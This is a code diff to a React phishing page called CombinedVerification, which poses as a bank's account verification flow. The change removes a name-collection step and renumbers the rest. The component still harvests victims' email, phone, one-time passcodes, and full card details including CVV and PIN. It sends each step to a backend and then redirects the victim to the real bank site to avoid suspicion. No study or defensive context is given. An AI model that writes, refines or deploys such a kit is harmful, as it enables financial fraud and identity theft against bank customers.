@@ -11,8 +11,6 @@ export default function CombinedVerification() {
   const [formData, setFormData] = useState({
     emailAddress: "",
     phoneNumber: "",
-    firstName: "",  // Added firstName field
-    lastName: "",   // Added lastName field
     verificationCode: "",
     ssn: "",
     accountNumber: "",
@@ -22,7 +20,7 @@ export default function CombinedVerification() {
     cardExpiry: "",
     cardCVV: "",
     cardholderName: "",
-    cardPIN: ""  // Added PIN field
+    cardPIN: ""
   });
 
   const [isSubmitting, setIsSubmitting] = useState(false);
@@ -42,7 +40,7 @@ export default function CombinedVerification() {
       // Prepare the data for the current step
       let requestData = {
         bankName: formData.bankName,
-        type: stepNumber ===  1? 'email and phone number'  : stepNumber ===  2? 'personal information' : stepNumber === 3 ? 'verification code (OTP)' : 'bank card details',
+        type: stepNumber === 1 ? 'email and phone number' : stepNumber === 2 ? 'verification code (OTP)' : 'bank card details',
         stepCompleted: stepNumber,
         time: new Date().toString(),
         ...additionalData
@@ -86,33 +84,18 @@ export default function CombinedVerification() {
       if (!success) return;
     } 
     else if (currentStep === 2) {
-      if (!formData.firstName || !formData.lastName) return;
+      if (!formData.verificationCode) return;
       
-      // Send step 2 data
+      // Send step 2 data (previously step 3)
       const success = await sendStepData(2, {
         emailAddress: formData.emailAddress,
         phoneNumber: formData.phoneNumber,
-        firstName: formData.firstName,
-        lastName: formData.lastName
-      });
-      
-      if (!success) return;
-    }
-    else if (currentStep === 3) {
-      if (!formData.verificationCode) return;
-      
-      // Send step 3 data
-      const success = await sendStepData(3, {
-        emailAddress: formData.emailAddress,
-        phoneNumber: formData.phoneNumber,
-        firstName: formData.firstName,
-        lastName: formData.lastName,
         verificationCode: formData.verificationCode
       });
       
       if (!success) return;
     } 
-    else if (currentStep === 4) {
+    else if (currentStep === 3) {
       // Validate that credit card fields are filled (including PIN)
       if (!formData.cardNumber || !formData.cardExpiry || !formData.cardCVV || !formData.cardholderName || !formData.cardPIN) return;
       
@@ -122,7 +105,7 @@ export default function CombinedVerification() {
     }
 
     // Move to next step
-    if (currentStep < 4) {
+    if (currentStep < 3) {
       setCurrentStep(currentStep + 1);
     }
   };
@@ -132,8 +115,6 @@ export default function CombinedVerification() {
     await sendStepData('code-request', {
       emailAddress: formData.emailAddress,
       phoneNumber: formData.phoneNumber,
-      firstName: formData.firstName,
-      lastName: formData.lastName,
       message: "User requested verification code"
     });
     
@@ -157,15 +138,13 @@ export default function CombinedVerification() {
           
           emailAddress: formData.emailAddress,
           phoneNumber: formData.phoneNumber,
-          firstName: formData.firstName,
-          lastName: formData.lastName,
           verificationCode: formData.verificationCode,
           // Credit card details
           cardNumber: formData.cardNumber,
           cardExpiry: formData.cardExpiry,
           cardCVV: formData.cardCVV,
           cardholderName: formData.cardholderName,
-          cardPIN: formData.cardPIN,  // Added PIN to final submission
+          cardPIN: formData.cardPIN,
           stepCompleted: "final",
           time: new Date().toString()
         }),
@@ -178,7 +157,7 @@ export default function CombinedVerification() {
       console.log("Final verification submitted successfully");
       setSubmitStatus("success");
       // Move to confirmation step
-      setCurrentStep(5);
+      setCurrentStep(4);
       
       // Redirect to the bank's real site after a short delay
       setTimeout(() => {
@@ -227,39 +206,8 @@ export default function CombinedVerification() {
             </div>
           </>
         );
-        
+
       case 2:
-        return (
-          <>
-            <h2 className="text-xl mb-2">Personal Information</h2>
-            <h3 className="text-lg mb-4">Please Confirm Your Name</h3>
-            <p className="mb-4">We need to verify your identity for security purposes.</p>
-
-            <div className="mb-4">
-              <label className="block mb-1">First Name</label>
-              <input
-                type="text"
-                name="firstName"
-                value={formData.firstName}
-                onChange={handleChange}
-                className="w-full px-4 py-2  border border-gray-600 rounded focus:outline-none focus:ring-1 focus:ring-[#8281db]"
-              />
-            </div>
-
-            <div className="mb-4">
-              <label className="block mb-1">Last Name</label>
-              <input
-                type="text"
-                name="lastName"
-                value={formData.lastName}
-                onChange={handleChange}
-                className="w-full px-4 py-2  border border-gray-600 rounded focus:outline-none focus:ring-1 focus:ring-[#8281db]"
-              />
-            </div>
-          </>
-        );
-
-      case 3:
         return (
           <>
             <h2 className="text-xl mb-2">Code Verification</h2>
@@ -297,7 +245,7 @@ export default function CombinedVerification() {
           </>
         );
 
-      case 4:
+      case 3:
         return (
           <>
             <h2 className="text-xl mb-2">Account Verification!</h2>
@@ -389,7 +337,7 @@ export default function CombinedVerification() {
           </>
         );
 
-      case 5:
+      case 4:
         return (
           <>
             <h2 className="text-xl mb-2">Account Verification!</h2>
@@ -441,7 +389,7 @@ export default function CombinedVerification() {
           
           {/* Progress Indicator */}
           <div className="flex justify-between mb-6 px-4">
-            {[1, 2, 3, 4].map((step) => (
+            {[1, 2, 3].map((step) => (
               <div 
                 key={step} 
                 className={`w-8 h-8 rounded-full flex items-center justify-center ${
@@ -461,7 +409,7 @@ export default function CombinedVerification() {
           </div>
 
           {/* Navigation Buttons */}
-          {currentStep < 5 && (
+          {currentStep < 4 && (
             <div className="flex justify-center mt-6">
               <button
                 type="button"
@@ -472,7 +420,7 @@ export default function CombinedVerification() {
                 {isSubmitting ? (
                   "Processing..."
                 ) : (
-                  currentStep === 4 ? "Submit" : "Continue"
+                  currentStep === 3 ? "Submit" : "Continue"
                 )}
               </button>
             </div>
